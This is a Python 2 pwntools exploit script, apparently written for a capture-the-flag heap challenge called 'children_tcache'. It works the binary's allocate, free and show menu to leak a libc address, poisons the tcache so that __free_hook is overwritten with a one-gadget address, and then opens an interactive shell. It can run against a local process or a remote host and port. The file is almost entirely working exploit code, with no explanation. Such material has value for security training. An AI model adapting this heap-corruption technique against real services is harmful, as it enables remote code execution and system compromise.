#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time
import os

# IP = "52.68.236.186"
# PORT = 56746
IP = "192.168.33.1"
PORT = 9999

one_gg = 0x4f322

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
BIN = "./children_tcache"

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
elif args.local or args.debugger:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    # libc_bb = io.libs()[os.path.abspath(
    #     os.path.join(os.getcwd(), "libc.so.6"))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

def allocate(size, data):
    io.recvuntil(":")
    io.sendline("1")
    io.recvuntil("e:")
    io.sendline(str(size))
    io.recvuntil("a:")
    io.send(data)


def show(idx):
    io.recvuntil(":")
    io.sendline("2")
    io.recvuntil("x:")
    io.sendline(str(idx))


def free(idx):
    io.recvuntil(":")
    io.sendline("3")
    io.recvuntil("x:")
    io.sendline(str(idx))


for i in range(6):
    allocate(0x80, "A")

allocate(0x38, "a")  # 6
allocate(0x4e0+0x490, "b")  # 7
allocate(0x410, "c")  # 8
allocate(0x80, "d")  # 9

free(7)
free(6)
allocate(0x68, "c"*0x68)  # 6
allocate(0x80, "d"*0x78)  # 7
free(5)
allocate(0x60, "da")  # 5
if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    p/x &__free_hook
    p/x &_IO_2_1_stdout_
    p/x 0x{:x} + 0x4f322
    c
    '''.format(
        proc_base + 0x0000000000000D6B,  # malloc
        proc_base + 0x0000000000000F7E,  # free
        proc_base + 0x0000000000000EC1,  # show heap
        libc_bb + one_gg, # one gadget
        libc_bb
        )
    )

for i in range(5):
    free(i)
free(9)
free(7)
free(8)
allocate(0x90, "ccc")
allocate(0x7f0-0xa0, "d")
allocate(0x50, "d")
free(5)
allocate(0x30, "a")
allocate(0x60, "a")
allocate(0x20, "gg")
show(4)
libc = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0x3ebca0
print hex(libc)
free_hook = libc + 0x3ed8e8
free(0)
allocate(0xa0, "b"*0x70 + p64(free_hook))

allocate(0x90, "b")
magic = libc + 0x4f322
allocate(0x90, p64(magic))

free(5)
io.interactive()




